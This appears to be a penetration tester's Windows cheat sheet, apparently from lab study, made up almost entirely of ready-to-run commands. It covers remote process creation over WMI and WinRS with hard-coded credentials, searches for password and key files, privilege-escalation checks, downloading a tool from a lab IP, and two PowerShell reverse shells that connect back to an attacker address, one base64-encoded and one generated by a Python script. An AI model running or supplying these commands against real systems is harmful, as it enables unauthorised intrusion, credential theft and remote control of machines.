################  
## CMD PROMPT ##  
################  
  
# WMI  
wmic /node:ip /user:user /password:password process call create "calc"  
  
# WinRS  
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"  
  
  
## Make a service  
sc config <servicename> binPath="C:\Users\Path.exe"  
net start servicename  
  
############  
# POWERSHELL #  
############  
  
# User/Group Awareness  
Get-LocalUser  
Get-LocalGroup  
Get-LocalGroupMember GROUP  
  
# Installed Apps  
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname  
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname  
  
# Running Processes  
Get-Process  
  
# Search For Files  
Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx  -File -Recurse -ErrorAction SilentlyContinue  
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue  
Get-ChildItem -Path C:\ -Recurse | Get-Acl | grep "Everyone"  
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx -File -Recurse -ErrorAction SilentlyContinue  
Get-ChildItem -Path C:\Users -Include * -Recurse -ErrorAction SilentlyContinue  
Get-ChildItem -Path C:\ -Include "id_rsa" -File -Recurse -ErrorAction SilentlyContinue  
Get-ChildItem -Path C:\ -Include "CONTRO~1.EXE" -File -Recurse -ErrorAction SilentlyContinue  
  
# Find Files with "pass" in it  
findstr /M /S "pass" "C:\*"  
  
# PS Version of WMI  
$username = 'jen';  
$password = 'Nexus123!';  
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;  
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;  
$options = New-CimSessionOption -Protocol DCOM  
$session = New-Cimsession -ComputerName 192.168.186.72 -Credential $credential -SessionOption $Options   
$command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA3ACIALAA1ADYANwA4ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';  
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};  
  
# Can Also do PSRemoting  
New-PSSession -ComputerName 192.168.186.73 -Credential $credential  
Enter-PSSession 1  
  
# Get Running Services  
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}  
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v '”'  
  
# Get Scheduled Tasks  
schtasks /query /v /fo LIST  
  
# Escalate cmd as another user  
runas /user:ADMIN cmd  
  
# Get privileges of binary  
icacls “binary”  
  
# Powershell History  
Get-History  
(Get-PSReadlineOption).HistorySavePath  
  
# Invoke Web Request  
iwr -uri http://192.168.45.182/Seatbelt.exe -Outfile nothinHere.exe  
  
# Unquoted Service Paths  
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v '"'  
  
# Not only auto services  
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '"'  
  
# Path DLL Hijacking  
Check permissions of all folders inside PATH  
  
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )  
  
# Find specific process  
tasklist /FI "ImageName eq CONTRO~1.EXE" /v /fo List  
  
# List running processes and grab their handle and file path  
gwmi win32_process | select Name, Handle, CommandLine | format-list  
gwmi win32_process | select ProcessId, Description, CommandLine | format-list  
  
  
# Select only the name and handle of a process   
Get-Process | select Handles, Name  
  
########   
Python Script for PowerShell CB   
########   
import sys  
import base64  
  
payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'  
  
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()  
  
print(cmd)  
########